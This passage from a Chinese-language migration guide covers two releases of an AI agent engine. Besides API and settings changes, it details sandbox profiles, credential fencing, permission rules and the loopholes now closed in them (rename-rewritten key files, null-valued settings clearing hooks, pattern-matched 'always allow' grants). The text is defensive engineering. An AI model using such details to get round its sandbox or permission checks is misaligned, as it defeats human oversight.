  `spec()`(再按需改字段),写法见 `extension_points.md`「实现一个工具」。

**工具进度接通了。** 以前每次工具调用拿到的 `ProgressSender` 是空的,`send` 什么也不做;现在
引擎给每次调用一个真的,报的进度成为 `AgentEvent::ToolProgress { tool_use_id, name, message,
progress, total, dropped, turn_id }`(每次调用每秒至多一条)。`progress` / `total` 仍是 `f64`,
序列化时整数值写成 JSON 整数(新增的 `base::event::progress_count_json` 就是这条规则),自己把这个
事件转成 JSON 的嵌入方用它就能和 daemon 发的帧一致。

- 对 `AgentEvent` 做穷尽 `match` 的要加一支。
- 已经调 `progress.send(..)` 的工具不用改。要报计数的用新的 `progress.update(ProgressUpdate::text(..).with_progress(..))`;
  `ProgressCallback` 多了带缺省实现的 `on_update`,只实现 `on_progress` 的照旧能编译。`Bash` 报的
  每一行不再带结尾的换行。
- 写法见 `extension_points.md`「报进度」。

#### 子 Agent

- `AgentSpawner` 的主入口是 `spawn(SpawnRequest)`(0.3.10 里没有这个方法,必须实现的是 `spawn_agent`):`SpawnRequest::new(prompt, cwd, cancel)`,
  再按需填 `agent_type`、`model`、`allowed_tools` 与 `mode`(`SpawnMode::Wait` 等最终文本、
  `Background { session }` 立即返回任务 id、`TeamMember { extra_tools, permission_mode, seat }`)。
  旧的 `spawn_agent`、`spawn_agent_on_model`、`spawn_agent_background`、`spawn_agent_with_tools`
  已删除,没有过渡。
- 自己实现 `AgentSpawner` 的:把 `spawn_agent` 改成实现 `spawn`,它没有缺省实现。`SpawnRequest` 与 `SpawnMode`
  标了 `#[non_exhaustive]`:crate 外用 `SpawnRequest::new(..)` 再按需改字段(`..SpawnRequest::new(..)`
  的结构体更新写法在 crate 外同样不可用,逐字段赋值),`match SpawnMode` 要有通配分支。
- 宿主起子 Agent 的 `start_agent(AgentRequest, …)` 不变。
- `SpawnMode` 多一个 `Hook { judged_session }`:agent hook 起的子 Agent,不占
  `max_concurrent_subagents`;`judged_session` 是触发这个 hook 的事件所属的会话,它本身是 hook 起的
  子 Agent 时 `RuntimeAgentSpawner` 拒绝。`Background { session }` 的任务挂在请求 `cancel` 的子令牌上,
  停任务不再取消调用方的令牌。
- 新增 `Builder::memory_extraction(bool)`(缺省 `true`):关掉后每轮结束不再起记忆抽取,读记忆不受影响。
- `runtime::module::SessionContext` 多一个公开字段 `template_tools`:会话建的时候传进
  `Builder::tools` 的那一份。起子会话的模块从它继承工具,不要从 `cx.tools` 继承——后者还装着
  引擎和各模块注册的、子会话会自己再注册的工具。`SessionContext` 不在 crate 外构造,只读的模块不用改。
- `AgentTool::with_parent_tools` / `with_shared_agent_types` 的两个注册表分了工:`parent_tools` 是父会话
  自己的注册表,`fallback_tools` 是它建的时候的模板;子 Agent 继承的是模板里父会话还留着的工具。
  两个传同一份(`AgentTool::new` 即如此)的行为不变。
- `Builder::build()` 结束时检查工具表里没有重名:debug 构建与测试里断言失败,release 构建记一条
  `error`。自己往模板里放 `Skill`、`TaskStop` 这类引擎会再注册的工具的嵌入方会撞上它。
- 子 Agent 的 MCP 授予从工具表改成会话的 `McpServers`:
  - `McpServers` 多一个带缺省实现的 `granted(servers: Option<&[String]>) -> Box<dyn McpServers>`,
    给子会话一份同样连接、按 server 收窄的视图;缺省返回 `NoMcpServers`,自己实现 `McpServers` 又要
    子 Agent 拿到授予的,要实现它。`McpManager` 的实现是新的 `McpManager::share_servers`。
  - `SessionContext::mcp_tools()` 删除,改用 `mcp_for_delegates()`(会话的 MCP 视图,可再 `granted`)。
  - `AgentTool::set_mcp_tool_adapters(Vec<Arc<dyn Tool>>)` 改为 `set_mcp_servers(Arc<dyn McpServers>)`。
  - 新增 `Builder::mcp_servers(Box<dyn McpServers>)`:会话一建好就有的 MCP server,工具照 mcp 模块
    给的那样注册与宣告;之后有模块 `provide_mcp` 的,以模块的为准。

#### 执行层与 platform

**本机执行层搬进 `platform`。** 执行层的本机实现、崩溃钩子与进程身份从 `base` 搬进新的
`platform` crate。依赖方向是 `platform → base`,`base` 不能反过来重新导出 `platform` 的东西,
所以**旧路径没有留垫片**:用到它们的在 `Cargo.toml` 里加上 `platform`,按下表改路径。

| 0.3.10 | 0.3.11 |
|---|---|
| `base::interface::exec::local::*` | `platform::*`,例如 `local::LocalNetwork` → `platform::LocalNetwork`、`local::sandbox::fence_port` → `platform::sandbox::fence_port`、`local::orphans` → `platform::orphans` |
| `base::crash` | `platform::crash` |
| `base::process_identity` | `platform::process_identity` |
| `ExecProviders::local()` / `local_with(env)` / `local_with_ledger(env, ledger)` | `platform::local_providers()` / `local_providers_with(env)` / `local_providers_with_ledger(env, ledger)` |
| `ToolContext::for_test(cwd)` | `platform::tool_context_for_test(cwd)`;要别的 provider 的用 `ToolContext::for_test_with(cwd, exec)` |
| `ToolContext::from_engine_ctx(cwd, cancel)` | `platform::tool_context_from_engine_ctx(cwd, cancel)`,或 `ToolContext::from_engine_ctx_with(cwd, cancel, exec)` |
| `base` 的 feature `http`、`sandbox` | `platform` 的同名 feature;`assembly/sandbox`、`daemon/sandbox` 照旧转发 |

- `ExecProviders` 不再实现 `Default`:`base` 不知道"本机"是什么,要本机的显式写
  `platform::local_providers()`。
- `SubprocessEnv`、`SubprocessEnvMode` 与 `hold_back_credential`、`is_engine_credential` 留在
  `base`——它们是 `sandbox.subprocess_env` 设置的类型和引擎的凭据表,`base` 自己要读——路径是
  `base::interface::exec::env::*`(`base::interface::exec::{SubprocessEnv, SubprocessEnvMode}`
  也行)。`platform::env` 与 `platform::SubprocessEnv` 是同一份的再导出,所以上表第一行整体替换
  也编得过。
- `EngineConfig::process_groups` 删除。它只在 `Builder` 内部转手:会话的进程组台账一直经
  `Builder::process_groups(ledger)` 给,这条不变。
- `platform::sandbox::fence_socket` / `fence_port` / `fence_secret` 返回 `Fence`,持有期间才挡,
  丢掉就注销(`#[must_use]`);自己起监听器、写凭据文件的,把它和监听器或文件放在一起。
  `DaemonServer::bind_unix` 返回 `UnixBinding`(监听器连同它的 `Fence`),`serve_unix_listener`
  收它。`UnixBinding` 的字段是私有的:只是把 `bind_unix` 的结果转手给 `serve_unix_listener` 的调用方
  不用改,自己 bind socket 再交给 `serve_unix_listener` 的写法(socket activation 之类)走不通了,
  要么改走 `bind_unix`,要么自己 accept;`discovery::UnixSocketTokenFile::create` 写 token 文件并登记,
  丢掉时先删文件再注销。
- `MemoryStore::load_all` 最多返回 `MAX_MEMORIES` 条(最近的在前,超出时 warn),`load_index`
  最多列这么多条;要磁盘上的实数用新的 `MemoryStore::count`。记忆目录的写锁改用
  `base::dir_lock::DirLock`(与 `settings_file` 同一套:进程内锁加 unix 上的 `flock`),别的
  进程写同一目录时会排队等。

**权限判断与执行用同一套 provider。**

- `SessionState` 新增 `bind_exec(exec)` / `exec()`。`Builder::build()` 给会话造一次
  `ExecProviders`,工具调用与引擎自己的 git 用它,并绑在会话的 `SessionState` 上。
- `RuleSetPermission` 与子 Agent 的权限包装构造 `ToolContext` 时取被判会话的
  `SessionState::exec()`,没绑过的(自己拼 `SessionState`、不经 `Builder` 的)仍用本机,与以前相同。
  自己实现 `Permission` 并构造 `ToolContext` 的照此改。

#### 设置、daemon 与遥测

- **`PathSettings` 说清有没有项目。** 新字段 `workspace: base::settings::Workspace`:
  `Project(<项目根>)` 或 `Scratch(<无项目会话的工作目录>)`。`PathSettings::project_root()` 改为返回
  `Option<&Path>`(无项目是 `None`),工具的工作目录改取 `PathSettings::working_dir()`;以前
  `project_root()` 对无项目会话返回状态目录的上一级。逐字段构造 `PathSettings` 的补
  `workspace: Workspace::project_of(&local_data_dir)`(与以前的推导相同)。无项目的设置用新的
  `Settings::load_without_project(global, scene, scope, model)` 加载,不要再把状态目录当
  `local_dir` 传给 `Settings::load`——那样得到的是"以家目录为项目"。新增
  `base::paths::session_scratch_dir`;会话池建会话时把 `Scratch` 换成会话自己的那一个。
- 随之改签名的:`runtime::plugin::PluginSession::project_root` 成为 `Option<&Path>`;
  `base::frozen::load_session_skills` / `load_session_skills_with_bundled` 的第一个参数是
  `Option<&Path>`(项目根,`None` 不扫项目级 skills);新增 `FrozenContext::collect_without_project`
  与 `CollectOptions::outside_project`。
- `ConfigPaths` 多了 `project_root: Option<PathBuf>`(`ConfigPaths::new` 取 `local_data_dir` 的上一级,
  `from_settings` 取 `PathSettings::project_root()`);`PromptFiles::for_project` 以它为限定的根,
  无项目时没有根。`PathSettings::local_settings_file()` 改为返回 `Option<PathBuf>`,无项目是 `None`;
  `ToolExecCtx::local_settings_path` 随之是 `Option`。
- `base::settings::Settings::session_dir` 标了 `#[deprecated]`:结构体字面量里写 `session_dir: None`
  会出 deprecation warning(`-D warnings` 下是错误)。改用 `..Settings::defaults_for(..)` 补齐,或者在
  那个函数上 `#[allow(deprecated)]`,等字段删除时再去掉。新增 `base::settings::deprecated_settings_keys`。
- `base::settings::Settings` 多了 `mcp_server_dirs: HashMap<String, PathBuf>`(不从配置读,`serde`
  跳过;`Settings::load` 填写每个 `mcp_servers` 条目的 `command` 来自哪一层的目录):用结构体字面量
  构造 `Settings` 的要补 `mcp_server_dirs: Default::default()`。表里没有的 server 由会话池放在全局
  配置目录启动。
- `assembly::discovery::InstanceFile` 多了 `unix_socket_auth: bool` 与 `token_file: Option<PathBuf>`
  (旧文件缺这两个键照样读得进来);逐字段构造的要补上。新增 `DaemonServer::require_unix_socket_auth`、
  `assembly::discovery::{unix_socket_token_path, write_unix_socket_token}` 与
  `platform::sandbox::fence_secret`(登记一个沙箱里的命令一律读不到的文件)。
- `base::context::SessionState::carry_goal_arming_from` 与 `carry_tasks_and_notices_from` 合成
  `carry_session_state_from(&previous)`:重建引擎时把旧状态里跨回合的部分(`plan` 模式、todo、
  已加载的 deferred 工具、后台任务、未读通知、目标的 arming、文件快照与回合号、读文件记录)搬到
  新状态上,在新状态读回转录之后调。调旧的两个的嵌入方改调它。在 `plan` 里的,搬过去之后退出
  回到进入 `plan` 之前的模式(和从转录恢复的一致),不是新状态建起来时的模式。
- `base::context::SessionState` 新增 `durable_state()` / `unrecorded_durable_state()` /
  `restore_durable_state(..)` 与类型 `DurableState { plan: Option<PlanState>, todos }`、
  `PlanState { exit_to }`,常量 `SESSION_STATE_NS` / `SESSION_STATE_EVENT`(`agix.session_state` /
  `change`)。`Agent` 每轮结束和停下时有变化就写这条扩展条目,`Agent::resume_session` 读回;
  自己写会话日志的嵌入方不用做什么。这是 0.3.12 让会话持有 `SessionState`、去掉 `carry_*` 的
  第一步:跨引擎的状态以日志为准。
- `runtime::agent::EngineCommand::CancelTurn` 改为 `CancelTurn { turn_id: Option<String> }`。
  `Some(id)` 只取消那一轮,它的消息还没进引擎时,进来就是取消的;`None` 是最近交给引擎的那一轮,
  即以前的行为。两种都不再碰已经结束的一轮(以前空闲时发它会取消刚结束那一轮的令牌,连带停掉
  它起的后台任务)。原来写 `EngineCommand::CancelTurn` 的改成 `CancelTurn { turn_id: None }`。
- `telemetry::RedactionPolicy` 只剩 `redact_error_messages`:`apply()`、`recommended()` 与 `redact_paths` /
  `redact_emails` / `redact_ip_addresses` / `redact_env_vars` 四个开关(从来没有走到过)删除,
  `telemetry` 不再依赖 `regex`。写了这四个字段的结构体字面量要删掉它们。
- `runtime::agent::Agent::compact_now` 多一个 `&CancellationToken` 参数:它取消时摘要放弃、历史不变,
  返回 `None`。不需要中断的传 `&CancellationToken::new()`。

## 0.3.11 之后:到 0.3.12

0.3.12 把几处"同一件事有几条路径"收成一条:工具对权限只报事实、由引擎的 `Policy` 一处判定;
子 Agent、团队成员、fork skill、宿主起的 Agent、agent hook 都经 `Delegator::delegate` 派发;
会话池拆成门面加协作者,会话状态跟着会话走、重建只换引擎,回合交给池里的驱动跑;RPC 方法表
全部类型化;一轮怎么失败有了结构化的 `TurnFailure`;场景是数据(`SceneSpec`);设置拆成文件值
(`Settings`)与加载结果(`LoadedSettings`);引擎自己起的进程走会话的 `exec.process`。

对部署方是一批权限收紧(工具不报事实就问、未信任项目层逐键白名单、"总是允许"只放行原文、
只读通道跑在严格 profile 里)和子 Agent 工具面的收窄;对 RPC 客户端是参数严格读、
`ENGINE_ERROR` 带 `data`、几种新帧与新取值;对嵌入方是一批删除与改名,没有兼容层。

最低 Rust 版本不变。更早各节里写到、这一版已删除或改名的路径,在"嵌入方"的"路径去向"一栏
集中说明,那些小节本身保持原样。

### 部署 `agixd` 的

#### 权限判定

- **工具只报事实,判定在引擎的 `Policy` 一处做。** 判定顺序见 `ARCHITECTURE.md` §6。部署能看到的
  差别:模式分派要问时,提示语用工具自己的问句(如 "Bash command requires confirmation"),没有问句
  才是 "Allow <tool>?";managed 层读不了时未知工具也直接拒绝(以前先问);`PreToolUse` hook 拦下的
  调用现在触发 `PermissionDenied` hook;输入不合法的调用先报校验错误,不再先报被 hook 拦下。
- **没有声明权限事实的工具每次调用都问,无人值守时拒绝。** 内建工具、MCP 工具、示例插件都声明了;
  宿主编译进来的 Rust 插件工具要实现 `permission_facts`(见"嵌入方")。
- **`durable: true` 的 `CronCreate` 在 `default`、`acceptEdits` 下要问,无人值守时拒绝。** 以前直接
  放行。`permission_rules` allow、hook approve、`bypassPermissions` 照样放行。
- **人答的"总是允许"只放行字面相同的调用。** 本会话与本项目两档按工具名相等、内容去首尾空白后字面
  相等匹配:以前答过 `touch *.rs` 的"总是允许"会放行 `touch other.rs`,现在只放行 `touch *.rs` 这一条
  原文;`git log:*`、带 `?` 的 URL 同理。写进 `settings.local.json` 的条目多一个 `"match": "exact"`;
  旧版本写下的、不带 `match` 的条目照旧按模式读。deny / ask 规则、宿主策略的 deny 照样排在它前面。
  skill 的 `allowed-tools`(本轮授权)仍按模式匹配。
- **会话不记授权时不再提供"总是允许"。** 宿主配 `PermissionSet::without_grants` 的会话,`Elicitation`
  收到的选项里没有 `permit_always`;万一仍答了,只放行这一次并告警,不写盘。
- **子 Agent 的询问由子会话自己的 runtime 发出。** 帧仍在父会话上发、`message` 仍带
  `[sub-agent <id>]` 前缀与 `task_id`;不同的是 `PermissionRequested`、`Notification` hook 在子会话上
  触发,超时与取消按子会话的设置与取消令牌,拒绝文本与父会话自己的问题一致(`Denied by permission: …`)。
  子 Agent 答 `permit_always` + `local` 现在写进项目的 `settings.local.json`(以前一律降成本会话)。
  父会话通道已关时的拒绝文本改为 "the parent session closed before it could answer. Original
  prompt: …"。
- **程序发起的调用要问时直接拒绝。** `RunCode` 的子调用不再走 elicitation,文本为
  "Denied by permission: <问句> — this call needs the user's approval, which a program cannot
  ask for — …";程序起的子 Agent 被拒时文本为 "<问句> — a sub-agent started from a program cannot
  ask for the user's approval — leave this step out of the program and run it directly"。
- **fork skill 的 `allowed-tools` 在 fork 出的子会话里生效。** 它只回答模式本来要问的那一问:deny、
  ask 规则、managed ask、plan / dontAsk 的拒绝、凭据都不受影响;无人值守的 fork 里被授权的命令也能跑。
  授权不写进父会话,fork 结束后父会话里同一条命令照样要问。子 Agent 内联运行的 skill 的
  `allowed-tools` 同样只在它自己的回合里生效。
- **设置里的 `execution.permission_prompt_timeout_secs` 生效了。** 以前 daemon 总拿
  `--permission-prompt-timeout`(缺省 300)盖掉它;现在优先级是命令行 > 设置 > 300,显式写
  `--permission-prompt-timeout 300` 也算给了。`session.resume` 报的 `permission.prompt_timeout_secs`
  按同一规则取。要改的:设置里写了这个值、却靠命令行缺省的 300 兜底的部署,删掉设置里的值或在命令行写明。

#### 未信任的项目

- **项目层设置改成逐键白名单。** 以前扣下一份名单、其余放行;现在设置文件里能出现的每个键各有一条
  归类(放行、只能往严处改、扣下),没有条目的一律扣下并列进 `requires_trust`。新扣下的:
  `sandbox.reap_process_groups` 关掉、`telemetry_enabled` 关掉、`plugins.enable_on_install` 打开、
  `execution.team_enabled` 打开;`execution` 下 `max_agent_depth`、`max_api_calls_per_turn`、
  `max_budget_tokens`(`null` 即不限)、`max_concurrent_subagents`、`max_parallelism`、
  `team_max_persistent_members`、`team_member_idle_timeout_secs`、`team_stage_concurrency` 比下面
  几层大;`permission_prompt_timeout_secs` 更长或为 0;`model.api_type`、`prompt_override` 一律扣下。
  `hooks_config`、`scripts`、`telemetry_url`、`recorder`、`instruction_file` 写成 `null` 或空也扣下
  (以前能借此清掉用户层的值)。拼错的键扣下并列进 `requires_trust`(以前只告警忽略),`$schema`
  不算。类型不对的标量照旧由合并丢弃、记进 `ignored`。信任的项目照常生效,只是
  `project.status` / `daemon.doctor` 的 `requires_trust` 会多列出这些键,并按键名排序
  (`permission_rules.allow(...)` 仍在后面)。
- **沙箱关闭或兜不住时,未信任项目里引擎自己的 `git` 不再运行。** 每轮的快照只取 `.git/HEAD` 里的
  分支名(status、log、user、主分支为空),`EnterWorktree` 等报 "git refused";模型发起的
  `git status` 一类不再走只读通道自动放行,改为询问。可信项目、没有项目的会话不受影响。宿主要求
  沙箱(`require_enforcement`)而兜不住时,快照现在也带上分支名。

#### 沙箱与执行

- **只读通道放行的命令跑在严格 profile 里。** 只读通道放行的 `Bash`、`acceptEdits` 放行的只读
  `Monitor` 现在断网、只写会话 `TMPDIR`、只读可读根与系统根、最小环境(`PATH HOME USER LOGNAME
  SHELL TERM LANG LC_* TZ TMPDIR`,不吃 `sandbox.subprocess_env.allow`)、拒 IPC 出路;以前与人批准
  的命令同一个 profile。只读命令要用别的环境变量或读可读根之外的系统位置的,会失败或被问。人批准、
  规则、hook、bypass 放行的命令照旧跑在会话 profile 里;无人值守会话里放行的命令照旧拒 IPC。
- **`require_enforcement` 打开而沙箱兜不住时,命令在询问之前就被拒**(`PermissionDenied` hook 照常
  触发),不再出现"人批准了、命令却被拒";工具结果里不再有 `structured_content.refused =
  "sandbox_unenforceable"`。严格 profile 兜不住、会话 profile 兜得住时,只读命令改为询问。
- **`daemon.doctor` 新增检查 `sandbox.strict_profile`。** 机器兑现不了严格 profile(没有沙箱后端、
  Linux 没有 `bwrap`、开着 `dangerously_disable_sandbox`)时为 `degraded`,`doctor` 的总状态随之是
  `degraded`。
  `PATH` 上第一个 `git` 在可读根之外(asdf、`~/bin` 等 shim),或 git 配置 `include` 了可读根之外的
  文件时,严格 profile 跑不起引擎的 `git`,现在同样报为未兑现并列出每一条;以前报 Full。
- **Linux:只写指定根的策略(沙箱会话里引擎自己的 `git` 及其 filter driver)也整目录遮挡状态目录的
  凭据**,会话 `TMPDIR` 挖洞挂回;以前逐文件遮挡,rename 重写的密钥文件读得到。
- **命令之后检查嵌套仓库。** 每条不在严格 profile 里跑的命令(同步命令在结果之前,后台 `Monitor`
  在任务结束时)多跑一次 `git ls-files -s` 和一次有界目录遍历(跳过 `node_modules`、`target` 等依赖
  与构建目录)。命令在项目里留下未在 `.gitmodules` 声明、`config` 会拉起程序的嵌套仓库时:有人值守
  问"保留 / 移开",超时、拒答、取消按移开;无人值守或没人可问直接把它的 `.git` 改名为
  `.git.agix-quarantine-<UTC 时间>`(改回原名即可还原)。两种都在工具结果末尾附一行说明,发
  `Notification` hook 与 `notification` 帧;无害的嵌套 `.git`、未声明的 gitlink 只提示一次。
  skill 里的内联命令(`!` 前缀)跑完同样检查,它无人可问,危险的直接移开。改名走会话的
  `exec.filesystem`,远程执行环境里改的是远端那份。
- **外部内容围栏按可达范围统一加。** MCP 工具的结果(含错误)、`WebFetch` / `Ping` 的结果(含 HTTP
  错误页与重定向说明,`[HTTP 200 | …]` 结果头现在在围栏里面)、写到或读到可读根之外的
  `Grep` / `Glob` / `Edit` / `Write` / `NotebookEdit`(以前只有 `Read`)都放进
  `<external-content>`;开了 `sandbox.read_anywhere` 的会话读项目外文件不再加围栏;`RunCode` 程序
  发起的调用不加。
- **项目放在状态目录里、围栏被撤掉时,状态目录的配置对沙箱命令只读。** 以前这种部署只有状态目录的
  `settings.json` 和场景文件受保护,macOS 上状态目录的 `settings.local.json` 也可写。现在状态目录
  按配置根处理:`settings.json`、`settings.local.json`、`mcp.local.json`,以及 `skills`、`hooks`、
  `agents`、`mcp`、`plugins`、`rules`、`scenes`、`policy`、`scripts`、`output-styles` 目录,沙箱里的命令
  都不能写;cwd 本身所在的那个配置目录除外,否则项目整个不可写。macOS 用 deny 规则,不存在的目录同样
  拦住;Linux 用 tmpfs 盖住含凭据的目录、其余条目只读绑回,再把项目与会话 `TMPDIR` 挖洞挂回,之后改写
  或新建的凭据落在 tmpfs 下读不到(项目恰好是状态目录本身、或在凭据所在目录之上或之中时仍逐文件遮挡)。
  要改的:项目放在状态目录里、又让沙箱命令往这些位置写的,改成别的
  位置,或在沙箱外改。
- **macOS:profile 写出之后才新建的场景,它的场景文件也不可写。** `<状态目录>/scenes/<场景>/` 下的
  `settings.json`、`scene.json`、`prompt.md` 由正则统一拦住,会话中途新建的场景同样;状态目录根下的
  `scene.json`、`prompt.md` 也不可写。要改的:靠沙箱命令在会话里建场景并写这三个文件的,改在沙箱外做。
- **链进 `scenes/` 的场景目录按解析后的位置保护。** macOS 上它的 key 文件与 `mcp/oauth` 不可读、
  场景文件不可写;文件工具按真实路径读它的 `settings.json` 同样被拒(会话建好之后才链进来的不算)。
  Linux 上 `scenes/` 下的符号链接与普通文件留在 tmpfs 之下,沙箱里读不到那个场景。要改的:把场景
  目录做成符号链接、又要沙箱命令读它的部署,改成真目录。
- **凭据位置改由一张表生成,两个后端不再各写一份。** 文件工具与权限判定对 key 文件的判断变宽:
  "是它或在它之下"都算凭据,`<状态目录>/settings.json/x` 这样的路径也被拒。正常部署碰不到。
- **引擎的 `git` 与 `pdftotext` 走会话的 `exec.process`。** 以前直接起在宿主上,环境按缺省策略取,
  超时只杀 `git` 本身。现在每轮的 `git status`、worktree 的创建与清理、`ExitWorktree` 查未保存工作
  的 `git`(另有 15 秒上限)、`Read` 读 PDF 的 `pdftotext`(单次上限 120 秒)都经会话的
  `exec.process`:环境用 `sandbox.subprocess_env`,进程组随会话台账,超时整组停;会话命令进沙箱时
  它们也进同一个沙箱(只写会话 `TMPDIR`、不通网络)。要改的:设了 `sandbox.subprocess_env.mode =
  "allowlist"` 的部署,`git` 需要的变量(如自定义的 `GIT_*`)要补进 `allow`;`pdftotext` 装在沙箱
  读不到的位置的,放开读。
- **`RunCode` 的并发空位按池计。** 0.3.10 一节写的"进程内同时至多 2×CPU 个"现在是每个会话池各
  2×CPU 个,同一进程里的两个池不再互相挤占。
- **`sandbox.reap_process_groups` 在会话中途打开时,下一次重建起生效**(以前要新会话)。

#### 子 Agent 与团队

- **带白名单的 agent 类型只拿到白名单里的工具。** `explore`、`plan`、`code-reviewer` 及写了
  `allowed_tools` 的自定义类型,以前还拿到白名单外的引擎与模块工具(`Skill`、`Task*`、`Cron*`、
  `EnterWorktree` / `ExitWorktree`、`Agent`、`Team*` 等),现在要用须显式列出;类型 `mcp_servers`
  授予的 server 视同列在白名单里。类型的 `disallowed_tools` 现在也作用于 `mcp_servers` 授予的 MCP 工具。
- **子 Agent 没有 `CronCreate` / `CronList` / `CronDelete`,也不再自己读 `scheduled_tasks.json`、
  起调度。**
- **`mcp__<server>` 按工具来源匹配。** agent 类型、`session.startAgent` 与场景名单里的 `mcp__*`、
  `mcp__<server>`、`mcp__<server>__*` 按工具的 MCP 来源比对配置里的 server 名,`mcp__my.docs` 现在
  匹配得到 `mcp__my_docs__*` 的工具;不是 MCP 来源、名字恰好以 `mcp__` 开头的工具不再被放行。
- **场景的 `disallowed_tools` 在白名单非空时也生效。** 以前白名单非空就忽略黑名单。内建场景不变;
  依赖旧语义的自定义场景会变窄。
- **名额只有一条规则:持名额者不等。** 子 Agent 起的 `TeamCreate` 在名额满时成员被拒、团队报失败;
  根会话的团队成员排队等名额,并发不再越过 `max_concurrent_subagents`;常驻成员每跑一轮占一个名额,
  空闲时不占。模型直接调 `Agent`、宿主 `session.startAgent` 在根会话里到上限仍立即拒绝
  (`TASK_LIMIT`),`RunCode` 的 `agent()` 仍排队。
- **团队被中断后不再派发下一阶段。** 当前阶段收尾后停止,不做该阶段的汇总评判;排着等并发许可的
  成员不再派出;最后一个阶段汇总时被中断也算取消。`state.json` 与 `events.jsonl`(`team_completed`)
  写 `cancelled`,工具结果 `is_error` 为真;`events.jsonl` 的 `member_completed` 多一个 `cancelled`
  字段(读旧文件时缺省 `false`)。
- **停掉的常驻成员晚结束的那一轮不再改写状态。** 以前它会把同名接替者显示成 `Shutdown`,或把已被
  `TeamDelete` 删掉的团队重新登记出来。
- **带类型的 fork skill(`agent:`)、团队阶段成员与常驻成员也拿到类型的 `system_prompt`**(预载 skill
  在前,其后 `<system_prompt>\n\nTask: <prompt>`);以前只有 `Agent` 工具与 `session.startAgent` 起的
  才有。常驻成员只在第一条消息前拼。
- **等待模式的 fork skill、`TeamCreate` 的成员现在是父会话的任务**:`session.tasks` 看得到,
  `TaskStop` 停得了;被停下的 fork 报成错误(以前当成功返回部分文本)。前台委派失败时任务记为
  `failed`;准入被拒的委派不留任务;后台委派建 worktree 失败时工具调用直接报错。
- **agent hook 接上了取消。** 回合被中断时 command hook 的子进程被杀、prompt / http 的等待放弃、
  agent hook 的裁判子 Agent 停下;`PreToolUse` 跑完时回合已取消的调用不再执行。hook agent 的子孙
  会话的工具调用不再触发 agent hook;`on_error: "block"` 的 agent hook 不再把自己的 hook agent 的
  工具调用判成失败而全部拦下。
- **只通知的 hook 不再被取消掐掉。** 不回答引擎的事件(`PostToolUse`、`SubagentStop`、`SessionEnd`
  等)的 hook,在回合被中断、会话结束后照样跑到它自己的超时;`PostToolUse` 不再拿回合的取消令牌。
  代价:被中断的回合要等这些 hook 跑完才结束,最长到 hook 的超时。
- **子 Agent 继承宿主为这台机器给出的全部契约**:时钟(`environment`)、指令来源、宿主经
  `customize_session` 装的 tool / prompt middleware、结果变换、模型拦截、恢复策略、compactor、
  插件场景、记忆存储与召回(连同召回 hook)、任务路由。审计类 middleware 的计数会因此变多;子会话
  的 WebSearch、WebFetch、压缩、记忆调用也按路由走。

#### 模型调用与重试

- **`retry-after` 由两个 client 统一解析**(整数秒、三种 HTTP-date、`retry-after-ms`,过去的时间按 0),
  OpenAI 兼容侧也读;Anthropic 的过载与服务端错误也带上它,不只 429。有它时它是等待的下限(再加至多
  10% 抖动),超过 60 秒就放弃;首字节之后的原样重发用同一个上限,超过就以 `ENGINE_ERROR` 结束这一轮,
  由宿主决定什么时候再发。
- **响应头之前超时、200 响应开头就是 `error` 事件或 body 为空,都走首字节前的退避阶梯。** 以前前者在
  Anthropic 侧不重试,后者两层都不重试。
- **流开始之后的瞬时失败原样重发。** 中途断流、流中途空闲超时以前直接失败;现在引擎自带的恢复策略
  原样重发至多两次(等服务端给的时长,没给就 2 秒、8 秒),发 `model_retry` 帧;工具已经跑过的照旧直接
  失败。限流也会切到备用模型(以前只有过载)。一次调用至多恢复 4 次。
- **遥测 `api_error.error_kind` 取失败分类的名字**(`overloaded`、`context_too_long`、`rate_limited`
  …),不再是 `api` / `network` / `internal`;`http_status` 对所有带状态码的失败都有值。
- **录像里失败的 `end` 记录格式变了**(`{error: <分类>, http_status?, retry_after_ms?, message?}`),
  旧录像里的失败读不回来。
- **换模型重试、压缩后重发带上失败那次请求的 `cache_edits`**(以前置空)。
- **尺寸被拒后压缩重试也失败时,报摘要失败的分类**(如 `rate_limited`,可重试),`context_too_long`
  写进消息;以前总报 `context_too_long`。

#### 会话与日志

- **写日志失败的一轮照样完成,报 `persisted: false`。** 日志落后的会话不被空闲回收、不被腾位置驱逐;
  设置变更、`setPrompt`、换厂商的 `setModel` 要重建时先补写,补写失败报 `ENGINE_ERROR`
  (`kind: "persist_failed"`,可重试),旧引擎照跑。`daemon.doctor` 的 `runtime.sessions[].log.behind`
  报这种状态。
- **重建(设置变更、`setPrompt`、换厂商)保留会话状态。** `/cost` 的累计、输出目标、已调用的 skill、
  `created_at`、未读通知、文件读缓存都留着;驱逐或重启后 `ToolSearch` 加载过的工具随日志回来
  (`agix.session_state` 的 change 条目多一个 `activated_tools`)。
- **`agix.context` 条目由引擎写**,`at_ms` 取引擎的时钟(录制回放时是录制的时钟)。
- **压缩被取消或失败时撤回已经做的老化**,被清掉的工具结果原样留着,不发 `compact` 事件。
  撤回的是整步:工具结果预算的裁剪、预测式压缩一并放回,它们的上报与断路器计数在整步成功后才算。
  自动压缩时摘要失败、级联也没东西可丢,以前保留老化结果,现在整步撤回并退避。
- **会话中途接入的 MCP 工具按场景的 `deferred_tools()` 名单延迟。** 以前只对 `build()` 时已注册的
  工具生效。要改的:不想让某个 MCP 工具延迟的,把它从场景的 `deferred_tools()` 里去掉。
- **没有 `origin/HEAD` 的仓库里,快照的主分支回落到本地的 `main` / `master`**(以前回落从不生效,
  主分支总是空的),系统提示里的 git 段因此多一行。
- **宿主在内存里改的设置叠到池读入的每份设置上**(别的项目、`config.reload` 以前从盘上重读、丢掉
  宿主的改动);`config.reload` 重读守护进程自家设置时保留 `--max-tokens` 兜底。

#### 设置文件与插件

- **`settings.json` 里的 `session_dir` 按未知键告警**(以前是"已弃用")。生成的
  `settings.schema.json` 标题由 `Settings` 改为 `SettingsFile`,`$defs` 的 `PermissionRule` 改名
  `PermissionRuleEntry`、`PermissionAction` 改为 `RuleBehavior`,接受的值不变;规则条目多一个可选的
  `match`(只认 `"exact"`,写在 deny / ask 上告警后按模式读)。
- **`daemon.doctor` 的 `permission_rules_count` 包含 `settings.local.json` 的规则**(以前只数共享层);
  `settings.tiers` 检查报的是自家项目实际读的那份项目层文件。
- **插件 manifest 可写 `[plugin] requires_engine`**(如 `">=0.3.12, <0.4"`,不允许 pre-release 比较子)。
  不满足时加载与安装都失败(`plugin.install` 的错误带出两个版本,缓存里什么都不写);同名包装了多个
  版本、最高版本不满足时改用满足的次高版本,被跳过的在 `plugins.refused` 里报出。写法见
  `plugin_packages.md`。
